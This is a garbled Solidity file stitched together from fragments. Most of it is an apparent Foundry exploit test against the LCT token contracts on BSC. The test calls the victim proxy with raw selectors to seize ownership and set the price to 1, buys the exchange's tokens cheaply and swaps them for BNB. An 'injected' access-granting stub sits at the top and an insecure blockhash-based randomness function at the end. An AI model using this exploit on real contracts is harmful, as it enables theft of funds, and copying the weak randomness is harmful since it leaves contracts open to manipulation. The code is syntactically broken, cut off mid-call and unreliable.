
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

interface LCTExchange {
    function buyTokens() external payable};
contract LCTExp is Test {
    address victim_proxy = 0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41;
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    LCTExchange exchange = LCTExchange(0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06);
    IERC20 LCT = IERC20(0x5C65BAdf7F97345B7B92776b22255c973234EfE7);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 28460897);
        deal(address(this), 1 ether)};
    function testExp() external {
        emit log_named_decimal_uint("[Start] Attacker BNB Balance", address(this).balance, 18);
        bytes4 selector1 = 0xb5863c10;
        address temp = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE;
        bytes memory data1 = new bytes(36);
        assembly {
            mstore(add(data1, 0x20), selector1);
            mstore(add(data1, 0x24), temp)};
        (bool success1,) = victim_proxy.call(data1);
        require(success1, "change ownership failed");
        bytes4 selector2 = 0x925d400c;
        uint256 new_price = 1;
        bytes memory data2 = new bytes(36);
        assembly {
            mstore(add(data2, 0x20), selector2);
            mstore(add(data2, 0x24), new_price)};
        (bool success2,) = victim_proxy.call(data2);
        require(success2, "manipulate price failed");
        uint256 amount = LCT.balanceOf(address(exchange)) / 1e18;
        exchange.buyTokens{value: amount}();
        LCT.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(LCT);
        path[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(LCT.balanceOf(address(this)),;
            0,;
            path,;
function randWithBlock() public view returns (uint256) {
    return uint256(blockhash(block.number - 1));}